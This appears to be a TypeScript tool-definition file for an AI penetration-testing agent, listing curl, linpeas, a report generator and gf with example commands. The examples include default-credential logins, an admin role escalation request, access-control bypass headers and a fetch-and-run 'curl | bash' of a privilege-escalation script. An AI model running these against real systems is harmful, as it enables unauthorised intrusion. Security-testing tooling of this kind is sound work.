import type { ToolDefinition } from "./types.js";

export const UTILITY_TOOLS: ToolDefinition[] = [
{
    name: "curl",
    description: "Command-line HTTP client for crafting custom requests, testing APIs, sending payloads, and analyzing responses.",
    category: "utility",
    parameters: {
      url: { type: "string", description: "Target URL", required: true, examples: ["https://target.com/api/v1/users"] },
      method: { type: "string", description: "HTTP method (-X)", required: false, examples: ["-X GET", "-X POST", "-X PUT", "-X DELETE", "-X PATCH"] },
      headers: { type: "string", description: "Request headers (-H)", required: false, examples: ["-H 'Content-Type: application/json'", "-H 'Authorization: Bearer token123'", "-H 'X-Forwarded-For: 127.0.0.1'"] },
      data: { type: "string", description: "Request body (-d)", required: false, examples: ["-d '{\"username\":\"admin\",\"password\":\"test\"}'", "-d 'user=admin&pass=test'"] },
      flags: { type: "string", description: "Additional flags", required: false, examples: ["-v", "-k", "-L", "-s", "-o output.html", "--proxy http://127.0.0.1:8080", "-b 'session=abc'", "-i"] },
    },
    example_commands: [
      "curl -s -X POST https://target.com/api/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"admin\"}' -v",
      "curl -s https://target.com/api/v1/users/2 -H 'Authorization: Bearer eyJhbGci...' -H 'Content-Type: application/json'",
      "curl -s -X PUT https://target.com/api/v1/users/1 -H 'Authorization: Bearer token' -d '{\"role\":\"admin\"}' -v",
      "curl -s 'https://target.com/api/graphql' -X POST -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name}}}\"}' ",
      "curl -s -k https://target.com/ -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Original-URL: /admin'",
    ],
    typical_output: `HTTP/2 200
content-type: application/json
x-powered-by: Express

{"users":[{"id":1,"username":"admin","email":"admin@target.com","role":"admin"},{"id":2,"username":"john","email":"john@target.com","role":"user"}]}`,
  },
{
    name: "linpeas",
    description: "Linux privilege escalation enumeration script that searches for possible paths to escalate privileges.",
    category: "post_exploitation",
    parameters: {
      flags: { type: "string", description: "Execution flags", required: false, examples: ["-a", "-s", "-q", "-e /tmp/linpeas_output.txt"] },
    },
    example_commands: [
      "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash",
      "./linpeas.sh -a 2>&1 | tee linpeas_output.txt",
    ],
    typical_output: `╔══════════╣ SUID binaries
/usr/bin/pkexec
/usr/bin/sudo
/usr/local/bin/custom_app (Unknown SUID binary!)

╔══════════╣ Writable files in /etc
/etc/crontab
/etc/passwd

╔══════════╣ Interesting GROUP://
uid=33(www-data) gid=33(www-data) groups=33(www-data),1001(docker)

╔══════════╣ Cron jobs
*/5 * * * * root /opt/scripts/backup.sh`,
  },
{
    name: "report_generator",
    description: "Generate structured penetration test findings report with CVSS scoring, evidence, and remediation steps.",
    category: "reporting",
    parameters: {
      finding_title: { type: "string", description: "Vulnerability title", required: true, examples: ["SQL Injection in Search Parameter"] },
      severity: { type: "string", description: "CVSS severity rating", required: true, examples: ["Critical (9.8)", "High (8.1)", "Medium (5.3)", "Low (3.1)"] },
      description: { type: "string", description: "Detailed description of the vulnerability", required: true },
      impact: { type: "string", description: "Business/technical impact", required: true },
      steps_to_reproduce: { type: "string", description: "Step-by-step reproduction instructions", required: true },
      evidence: { type: "string", description: "Proof of exploitation (commands, screenshots, outputs)", required: true },
      remediation: { type: "string", description: "Recommended fix", required: true },
    },
    example_commands: [],
    typical_output: `## Finding: SQL Injection in Search Parameter
**Severity:** Critical (CVSS 9.8)
**Affected Endpoint:** GET /search?q=

### Description
The search parameter is vulnerable to SQL injection...

### Impact
Full database compromise, data exfiltration...

### Remediation
Use parameterized queries / prepared statements...`,
  },
  {
    name: "gf",
    description: "Grep wrapper using predefined or custom patterns to extract URLs matching specific vulnerability classes like XSS, SSRF, SQLi, LFI, RCE, and more.",
    category: "utility",
    parameters: {
      pattern: { type: "string", description: "Pattern name to use", required: true, examples: ["xss", "ssrf", "sqli", "lfi", "redirect", "rce", "idor", "ssti", "debug-pages", "interestingparams"] },
      input: { type: "string", description: "Input source (pipe or file)", required: false, examples: ["urls.txt", "cat urls.txt |"] },
      flags: { type: "string", description: "Additional grep flags", required: false, examples: ["-s", "--list"] },
    },
    example_commands: [
      "cat urls.txt | gf xss | tee xss_params.txt",
      "cat urls.txt | gf sqli | tee sqli_params.txt",
      "cat urls.txt | gf ssrf | tee ssrf_params.txt",
      "gau target.com | gf lfi | sort -u | tee lfi_params.txt",
    ],
    typical_output: `https://target.com/search?q=FUZZ
https://target.com/page?name=FUZZ
https://target.com/api/render?template=FUZZ
https://target.com/profile?user=FUZZ&callback=FUZZ
https://target.com/redirect?url=FUZZ
https://target.com/download?file=FUZZ
https://target.com/api/proxy?url=FUZZ`,
  },
];
